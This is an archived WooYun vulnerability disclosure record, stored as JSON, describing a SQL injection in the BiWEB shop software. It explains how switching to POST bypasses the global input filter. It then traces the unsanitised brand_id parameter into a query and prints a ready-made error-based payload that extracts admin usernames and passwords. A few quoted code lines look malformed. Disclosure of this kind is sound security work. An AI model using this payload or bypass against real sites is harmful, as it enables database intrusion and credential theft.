{"id": 42575, "wybug_id": "wooyun-2014-085303", "wybug_title": "BiWEB最新商城版绕过过滤字符型注入一枚", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-12-02 17:02", "wybug_open_date": "2015-03-02 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新商城版绕过过滤字符型注入一枚 详细说明：  在wooyun上看到了有人提了BiWEB的一个XSS漏洞： WooYun: BIWEB商城版XSS盲打cookie ，也有人提了SQL注入，我来找找其他的漏洞吧。去官网下BiWEB商城版最新的5.8.4来看看。注入点在http://192.168.0.107/brand/list.php?brand_id=1，其中brand_id存在注入漏洞先来看看BiWEB是怎么处理防注入的。首先BiWEB对用户输入进行了全局过滤filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\nfiltrateData()方法的实现见下面\n/**\t * filtrateData($ParamValue)\t * 作 用：递归去除所有值两边的空白\t * @author\tArthur <ArthurXF@gmail.com>\t * @param\t$ParamValue （需要过滤空白的数据）\t * @param\tarray\t$arrHtml （不需要过滤的数据key组成的数组）\t * @return\t去除空白之后的数据\t * 备 注：无\t */\tstatic function filtrateData(&$ParamValue,$arrHtml){\t\tif (is_array($ParamValue)){\t\t\tforeach ($ParamValue as $key=>$value){\t\t\t\tif(is_array($value)){\t\t\t\t\tcheck::filtrateData($value,$arrHtml);\t\t\t\t}else{\t\t\t\t\tif(v === 'v' || v === '' || strpos(p,v)) exit;\t\t\t\t\tif($key === 'v') {\t\t\t\t\t\techo v;exit;\t\t\t\t\t}\t\t\t\t\tif(count($arrHtml)){\t\t\t\t\t\tif(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value);\t\t\t\t\t\telse $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t\t}else $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$ParamValue = trim($ParamValue);\t\t}\t}\n这个过滤方法中，如果是POST方法就只对通过POST提交的用户数据进行过滤，GET方法同理。突然就想到一个方法，REQUEST_METHOD还是 POST，但是在url中带入用户数据（GET方法），然后程序中用$_GET数组来获取数据的话，那就可以获得通过url提交的数据，并且没有经过全局 过滤，这样就绕过了全局过滤。在/product/block/child_type.php中\n无关代码/** * 品牌类别block文件 * * @author\t\tArthur(ArthurXF@gmail.com) * @copyright\t(c) 2006 by bizeway.com * @version\t\t$Id$ * @package\t\tArthurXF * @subpackage\tproduct */if (is_object($objWebInit)) {\tif(!isset($objproduct)){\t\tinclude_once(__WEB_ROOT.'/product/class/product.class.php');\t\tinclude_once(__WEB_ROOT.'/product/config/var.inc.php');\t\t$objproduct =& new product();\t\t$objproduct->setDBG($arrGPdoDB);\t\tif(is_object($objWebInit->db)) $objproduct->db = $objWebInit->db;\t\telse $objproduct->db();\t}\t$arrTopInfo = array();\t$arrTopInfo = $objproduct->getTypeTileWithBrand(\"where t2.brand_id = '$_GET[brand_id]'\",' ORDER BY t1.initial');\t//print_r($arrTopInfo);\t// 输出到模板\t$arrMOutput[\"smarty_assign\"]['arrChildType'] = $arrTopInfo;}无关代码\n继续去看看getTypeTileWithBrand()，在/product/class/product.class.php中\nfunction getTypeTileWithBrand($where=null,$order=null){\t\t$strSQL = \"SELECT t1.*,count(t2.type_id) as nums FROM $this->tablename2 as t2 LEFT JOIN $this->tablename1 as t1 ON t1.type_id=t2.type_id \".$where.\" GROUP BY t2.type_id\".$order;\t\t$rs = $this->db->query($strSQL);\t\treturn $rs->fetchall();\t}\n可以看出，整个过程中没有其他的过滤，只要可以绕过全局过滤，就可以注入。如果按正常的情况使用GET提交，单引号被全局过滤编码，如下：\n\n把GET方法改为POST提交，成功引入单引号，如下:\n\n成功注入，管理员用户名及密码如下图中所示：\n\npayload如下\nhttp://xxx.com/brand/list.php?brand_id=1'/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x23,(select/**/concat(user_name,0x23,password,0x23)from/**/biweb_user/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/or/**/'\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}